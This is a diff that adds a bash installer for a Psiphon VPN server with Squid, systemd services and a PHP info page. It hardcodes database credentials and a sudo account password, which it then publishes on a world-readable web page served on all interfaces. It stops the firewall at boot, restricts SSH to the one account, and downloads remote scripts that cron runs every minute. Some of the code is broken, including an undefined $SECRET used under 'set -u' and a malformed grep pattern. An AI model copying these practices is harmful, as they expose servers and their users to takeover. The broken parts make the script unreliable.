@@ -1,0 +1,604 @@
+#!/bin/bash
+# Script Variables
+HOST='209.159.151.58';
+USER='datasoft_runutour';
+PASS='datasoft_runutour';
+DBNAME='datasoft_runutour';
+
+# Create database config for VPN panel integration
+mkdir -p /etc/xray /etc/firenet /root
+cat > /etc/.db-base << 'DBEOF'
+HOST='209.159.151.58'
+USER='datasoft_runutour'
+PASS='datasoft_runutour'
+DBNAME='datasoft_runutour'
+API_KEY='fZPG'
+PANEL_URL='https://runutour.com'
+DB='datasoft_runutour'
+DBEOF
+chmod 600 /etc/.db-base
+cp /etc/.db-base /root/.db-base
+cp /etc/.db-base /etc/xray/.db-base 2>/dev/null || true
+cp /etc/.db-base /etc/openvpn/login/config.sh 2>/dev/null || true
+
+# Setup web server for server info
+mkdir -p /var/www/html
+cat > /etc/systemd/system/serverinfo.service << 'SRVEOF'
+[Unit]
+Description=Server Info Web Server
+After=network.target
+
+[Service]
+Type=simple
+WorkingDirectory=/root/.web
+ExecStart=/usr/bin/php -S 0.0.0.0:5623 -t /root/.web/
+Restart=always
+RestartSec=3
+
+[Install]
+WantedBy=multi-user.target
+SRVEOF
+systemctl daemon-reload
+systemctl enable serverinfo
+systemctl start serverinfo
+
+PORT_TCP='None';
+PORT_UDP='None';
+PORT_SSL='None';
+OBFS='None';
+HYSTERIA_TYPE='default';
+﻿timedatectl set-timezone Asia/Riyadh
+set -euo pipefail
+
+# Define global variables
+readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+readonly INSTALL_DIR="/opt/5G"
+readonly PSIPHON_URL="https://gitlab.com/vollam/scripts/-/raw/main/psiphond"
+readonly SERVICE_FILE="/etc/systemd/system/psiphon.service"
+readonly LOG_FILE="/var/log/psiphon_setup.log"
+
+# Function to log messages to a file
+log_message() {
+    local log_timestamp
+    log_timestamp=$(date +"%Y-%m-%d %T")
+    echo "[$log_timestamp] $*" | sudo tee -a "$LOG_FILE" >/dev/null
+}
+
+# Function to check for required commands
+check_required_commands() {
+    local missing_cmds=()
+    for cmd in curl wget sed systemctl; do
+        if ! command -v "$cmd" &>/dev/null; then
+            missing_cmds+=("$cmd")
+        fi
+    done
+
+    if [[ ${#missing_cmds[@]} -ne 0 ]]; then
+        log_message "Error: Missing required commands: ${missing_cmds[*]}"
+        exit 1
+    fi
+}
+
+# Function to update DNS settings securely
+update_dns_settings() {
+    log_message "Updating DNS settings..."
+    sudo sed -i '/^#DNSStubListener=yes/c\DNSStubListener=no' /etc/systemd/resolved.conf
+    echo "DNS=1.1.1.1" | sudo tee -a /etc/systemd/resolved.conf >/dev/null
+    sudo systemctl restart systemd-resolved
+}
+
+# Function to install necessary packages
+install_packages() {
+    log_message "Installing necessary packages..."
+    if ! sudo apt-get update; then
+        log_message "Failed to update package repositories."
+        exit 1
+    fi
+    if ! sudo apt-get install -y curl wget screen xxd vnstat php default-mysql-client; then
+        log_message "Failed to install necessary packages."
+        exit 1
+    fi
+}
+
+# Function to download and set up Psiphon
+setup_psiphon() {
+    log_message "Setting up Psiphon in $INSTALL_DIR..."
+    sudo mkdir -p "$INSTALL_DIR"
+    log_message "Downloading Psiphon..."
+    if ! sudo wget -nv "$PSIPHON_URL" -O "$INSTALL_DIR/psiphond"; then
+        log_message "Failed to download Psiphon."
+        exit 1
+    fi
+    sudo chmod +x "$INSTALL_DIR/psiphond"
+
+    log_message "Generating Psiphon configuration..."
+    local ip_address
+    ip_address=$(curl -s https://api.ipify.org)
+    (cd "$INSTALL_DIR" && sudo ./psiphond --ipaddress "$ip_address" --web 8616 --protocol SSH:80 --protocol OSSH:53 --protocol UNFRONTED-MEEK-HTTPS-OSSH:443 generate)
+
+    sudo sed -i 's/"ServerIPAddress": "[^"]*"/"ServerIPAddress": "0.0.0.0"/g' "$INSTALL_DIR/psiphond.config"
+    log_message "Psiphon installation and configuration complete."
+}
+
+# Function to create and enable systemd service
+setup_systemd_service() {
+    log_message "Creating systemd service for Psiphon..."
+    sudo tee "$SERVICE_FILE" >/dev/null <<EOF
+[Unit]
+Description=Psiphon Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=$INSTALL_DIR/psiphond run
+WorkingDirectory=$INSTALL_DIR
+Restart=on-failure
+RestartSec=10s
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+    sudo systemctl daemon-reload
+    sudo systemctl enable psiphon.service
+    sudo systemctl start psiphon.service
+    log_message "Psiphon service is now enabled and started."
+
+echo "squid_port=8080
+secret=SECRET
+ssh_user=azimaxus
+ssh_pass=azim.0987Aa" >> /root/.ports
+
+sed -i "s|SECRET|$SECRET|g" /root/.ports
+
+echo "DB_HOST='$HOST'" >> /opt/5G/.db-base
+echo "DB_NAME='$DBNAME'" >> /opt/5G/.db-base
+echo "DB_USER='$USER'" >> /opt/5G/.db-base
+echo "DB_PASS='$PASS'" >> /opt/5G/.db-base
+}
+
+install_banner(){
+rm -f /etc/banner
+wget -O /etc/banner "https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/banner" >/dev/null 2>&1
+chmod +x /etc/banner
+sudo sed -i 's/^#Banner none$/Banner \/etc\/banner/' /etc/ssh/sshd_config
+}
+
+install_monitoring(){
+if ! command -v fastfetch >/dev/null 2>&1; then
+    arch=$(dpkg --print-architecture)
+    if [ "$arch" = "amd64" ]; then
+        if ! command -v fastfetch >/dev/null 2>&1; then
+    		wget 'https://gitlab.com/vollam/scripts/-/raw/main/fastfetch-linux-amd64.deb' -O /tmp/fastfetch.deb
+			sudo dpkg -i /tmp/fastfetch.deb
+		fi
+    else
+        echo "Unsupported architecture: $arch"
+    fi
+else
+    echo "Fastfetch is already installed."
+    fastfetch
+fi
+
+wget 'https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/n_monitor' -O /etc/.monitor
+chmod +x /etc/.monitor
+}
+
+install_squid(){
+apt install squid -y
+rm /etc/squid/squid.conf
+echo "acl Vollam dst `curl -s https://api.ipify.org`" >> /etc/squid/squid.conf
+echo 'http_port 8080
+http_port 8181
+visible_hostname Proxy
+acl PURGE method PURGE
+acl HEAD method HEAD
+acl POST method POST
+acl GET method GET
+acl CONNECT method CONNECT
+http_access allow Vollam
+http_reply_access allow all
+http_access deny all
+icp_access allow all
+always_direct allow all
+visible_hostname Vollam-Proxy
+error_directory /usr/share/squid/errors/English' >> /etc/squid/squid.conf
+rm /usr/share/squid/errors/English/ERR_INVALID_URL
+echo '<!--VollamDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">🔥 VOLLAM DEVELOPER 🔥</p></div></div></body></html>' >> /usr/share/squid/errors/English/ERR_INVALID_URL
+chmod 755 /usr/share/squid/errors/English/*
+cd /etc || exit
+}
+
+# Function to add sudo user and disable root access
+install_sudo(){
+  {
+    useradd -m azimaxus 2>/dev/null; echo azimaxus:azim.0987Aa | chpasswd &>/dev/null; usermod -aG sudo azimaxus &>/dev/null
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    echo "AllowGroups azimaxus" >> /etc/ssh/sshd_config
+    service sshd restart
+  }&>/dev/null
+}
+
+install_rclocal(){
+  {
+mkdir -m 777 /root/.web  
+
+sed -i 's/Listen 80/Listen 81/g' /etc/apache2/ports.conf
+systemctl restart apache2    
+
+echo "[Unit]
+Description=vollam service
+Documentation=https://vollam.com
+After=network.target network-online.target
+Wants=network-online.target
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash /etc/rc.local
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target" >> /etc/systemd/system/firenet.service
+
+rm -rf /etc/rc.local
+
+echo '#!/bin/sh -e
+service ufw stop
+sysctl -p
+systemctl restart psiphon.service
+systemctl restart squid.service
+screen -dmS webinfo php -S 0.0.0.0:5623 -t /root/.web/
+# Auto-fetch correct server API key from panel on each boot
+SERVER_IP_NOW=$(curl -s https://api.ipify.org)
+PANEL_URL_NOW=$(grep -oP "(?<=PANEL_URL='"'"')[^'"'"']*" /etc/.db-base 2>/dev/null || echo "")
+if [ -n "$PANEL_URL_NOW" ] && [ -n "$SERVER_IP_NOW" ]; then
+    NEW_KEY=$(curl -s "$PANEL_URL_NOW/api/v1/endpoints/auto_register.php?ip=$SERVER_IP_NOW" 2>/dev/null | grep -oP "(?<\"api_key\":\")[^\"]*")
+    if [ -n "$NEW_KEY" ]; then
+        sed -i "s|API_KEY='"'"'[^'"'"']*'"'"'|API_KEY='"'"'$NEW_KEY'"'"'|g" /etc/.db-base 2>/dev/null
+        sed -i "s|API_KEY='"'"'[^'"'"']*'"'"'|API_KEY='"'"'$NEW_KEY'"'"'|g" /root/.db-base 2>/dev/null
+        sed -i "s|API_KEY='"'"'[^'"'"']*'"'"'|API_KEY='"'"'$NEW_KEY'"'"'|g" /opt/5G/.db-base 2>/dev/null
+    fi
+fi
+bash /etc/.monitor psiphon
+exit 0' >> /etc/rc.local
+
+sudo chmod +x /etc/rc.local
+
+systemctl daemon-reload
+sudo systemctl enable firenet
+sudo systemctl start firenet.service
+    
+echo "Made with love by: Vollam Developer... " >> /root/.web/index.php
+sudo cp /opt/5G/server-entry.dat /root/.web/$SECRET-HEX.txt
+xxd -r -p /opt/5G/server-entry.dat > /root/.web/$SECRET-JSON.txt
+
+secret_hex=$(cat /root/.web/$SECRET-HEX.txt)
+secret_json=$(cat /root/.web/$SECRET-JSON.txt)
+
+wget -O /root/.web/firenet_logo.png "https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/firenet_logo.png"
+
+cat >/root/.web/$SECRET.php <<-PSIPHON
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Server Details — Fast & Secure</title>
+  <link rel="icon" href="/firenet_logo.png" type="image/x-icon">
+  <style>
+    :root {
+      --bg: #0a0a0a;
+      --card: #141414;
+      --accent: #ffd700;
+      --text: #f2f2f2;
+      --muted: #a5a5a5;
+      font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      overflow-y: scroll;
+      scrollbar-width: thin;
+      scrollbar-color: var(--accent) transparent;
+    }
+    ::-webkit-scrollbar {
+      height: 6px;
+      width: 6px;
+    }
+    ::-webkit-scrollbar-track {
+      background: transparent;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: linear-gradient(90deg, #b8860b, #ffd700);
+      border-radius: 10px;
+    }
+    .container {
+      width: 100%;
+      max-width: 600px;
+    }
+    header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      height: 44px;
+      width: 44px;
+      border-radius: 10px;
+    }
+    h1 {
+      font-size: 18px;
+      margin: 0;
+    }
+    p.lead {
+      color: var(--muted);
+      margin: 2px 0 0;
+      font-size: 13px;
+    }
+    .card {
+      background: var(--card);
+      border-radius: 12px;
+      padding: 18px;
+      box-shadow: 0 0 20px rgba(255, 215, 0, 0.1);
+      animation: glow 3s ease-in-out infinite alternate;
+    }
+    @keyframes glow {
+      from { box-shadow: 0 0 12px rgba(255, 215, 0, 0.3); }
+      to { box-shadow: 0 0 24px rgba(255, 215, 0, 0.6); }
+    }
+    h2 {
+      font-size: 15px;
+      margin-top: 0;
+      margin-bottom: 14px;
+      font-weight: 600;
+      color: var(--accent);
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+    .full {
+      grid-column: 1 / -1;
+    }
+    .field {
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 8px;
+      padding: 12px;
+    }
+    .label {
+      color: var(--muted);
+      font-size: 12px;
+      margin-bottom: 4px;
+      display: block;
+    }
+    .value {
+      font-family: ui-monospace, SFMono-Regular, monospace;
+      font-size: 14px;
+      word-break: break-all;
+    }
+    .input-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    input.readonly {
+      flex: 1;
+      background: rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 6px;
+      color: var(--text);
+      padding: 8px 10px;
+      font-family: ui-monospace, monospace;
+      font-size: 13px;
+    }
+    .copy-btn {
+      background: var(--accent);
+      border: none;
+      border-radius: 6px;
+      color: #222;
+      padding: 8px 12px;
+      font-weight: 600;
+      cursor: pointer;
+      white-space: nowrap;
+      transition: 0.2s;
+    }
+    .copy-btn:hover {
+      opacity: 0.9;
+    }
+    a.link {
+      color: var(--accent);
+      text-decoration: none;
+      font-weight: 600;
+    }
+    footer {
+      margin-top: 12px;
+      text-align: center;
+      font-size: 12px;
+      color: var(--muted);
+    }
+    @media (max-width: 720px) {
+      .grid {
+        grid-template-columns: 1fr;
+        gap: 10px;
+      }
+      .input-row {
+        flex-direction: column;
+        align-items: stretch;
+      }
+      .copy-btn {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div class="logo"><img src="/firenet_logo.png" alt="Vollam Developer"></div>
+      <div>
+        <h1>Happy Surfing!</h1>
+        <p class="lead">Your Psiphon server information is below.</p>
+      </div>
+    </header>
+
+    <main class="card">
+      <h2>Psiphon Server Details</h2>
+      <div class="grid">
+        <div class="field">
+          <span class="label">IP Address</span>
+          <div class="value">$server_ip</div>
+        </div>
+        <div class="field">
+          <span class="label">Hostname</span>
+          <div class="value">$DOMAIN</div>
+        </div>
+
+        <div class="field full">
+          <span class="label">SECRET-HEX.txt</span>
+          <div class="input-row">
+            <input id="hex-secret" class="readonly" readonly value="$secret_hex" />
+            <button class="copy-btn" data-copy-target="hex-secret">Copy</button>
+          </div>
+        </div>
+
+        <div class="field full">
+          <span class="label">SECRET-JSON.txt</span>
+          <div class="input-row">
+            <input id="json-secret" class="readonly" readonly value='$secret_json' />
+            <button class="copy-btn" data-copy-target="json-secret">Copy</button>
+          </div>
+        </div>
+
+        <div class="field full">
+          <span class="label">SSH Username</span>
+          <div class="input-row">
+            <input id="ssh-user" class="readonly" readonly value="azimaxus" />
+            <button class="copy-btn" data-copy-target="ssh-user">Copy</button>
+          </div>
+        </div>
+        <div class="field full">
+          <span class="label">SSH Password</span>
+          <div class="input-row">
+            <input id="ssh-pass" class="readonly" readonly value="azim.0987Aa" />
+            <button class="copy-btn" data-copy-target="ssh-pass">Copy</button>
+          </div>
+        </div>
+        <div class="field">
+          <span class="label">Facebook Page</span>
+          <a class="link" href="https://facebook.com/vollamdev" target="_blank">FIRENET</a>
+        </div>
+        <div class="field">
+          <span class="label">Contact</span>
+          <a class="link" href="https://wa.me/+966598126771" target="_blank">VOLLAM DEVELOPER</a>
+        </div>
+      </div>
+      <footer>Made with 💛 by Firenet</footer>
+    </main>
+  </div>
+
+  <script>
+    async function copyText(text) {
+      try {
+        await navigator.clipboard.writeText(text);
+        return true;
+      } catch (e) {
+        const ta = document.createElement("textarea");
+        ta.value = text;
+        ta.style.position = "absolute";
+        ta.style.left = "-9999px";
+        document.body.appendChild(ta);
+        ta.select();
+        try {
+          document.execCommand("copy");
+          document.body.removeChild(ta);
+          return true;
+        } catch {
+          document.body.removeChild(ta);
+          return false;
+        }
+      }
+    }
+
+    document.querySelectorAll(".copy-btn").forEach(btn => {
+      btn.addEventListener("click", async () => {
+        const id = btn.getAttribute("data-copy-target");
+        const input = document.getElementById(id);
+        if (!input) return;
+        const text = input.value;
+        const ok = await copyText(text);
+        if (ok) {
+          const orig = btn.textContent;
+          btn.textContent = "Copied!";
+          setTimeout(() => (btn.textContent = orig), 1400);
+        }
+      });
+    });
+  </script>
+</body>
+</html>
+
+PSIPHON
+
+  }&>/dev/null
+}
+
+# Function to display the contents of server-entry.dat
+display_server_entry() {
+    log_message "Displaying contents of server-entry.dat..."
+    if [[ -f "$INSTALL_DIR/server-entry.dat" ]]; then
+        sudo cat "$INSTALL_DIR/server-entry.dat"
+    else
+        log_message "server-entry.dat file not found."
+    fi
+}
+
+start_service () {
+clear
+echo 'Starting..'
+{
+
+sudo crontab -l | { echo "* * * * * /bin/bash /etc/.monitor psiphon >/dev/null 2>&1"; } | crontab -
+sudo systemctl restart cron
+} &>/dev/null
+clear
+}
+
+server_ip=$(curl -s https://api.ipify.org)
+server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
+
+# Main function
+main() {
+    # Set up logging
+    sudo touch "$LOG_FILE"
+    sudo chown "$(whoami)" "$LOG_FILE"
+    
+    log_message "Starting the setup process..."
+
+    install_sudo
+	install_banner
+    check_required_commands
+    update_dns_settings
+    install_packages
+    install_monitoring
+    install_squid
+    setup_psiphon
+    setup_systemd_service
+    install_rclocal
+    start_service
+
+    rm /usr/local/etc/.system
+    log_message "Setup completed successfully."
+    sleep 15
+    reboot
+}
+
+# Execute main function
+main
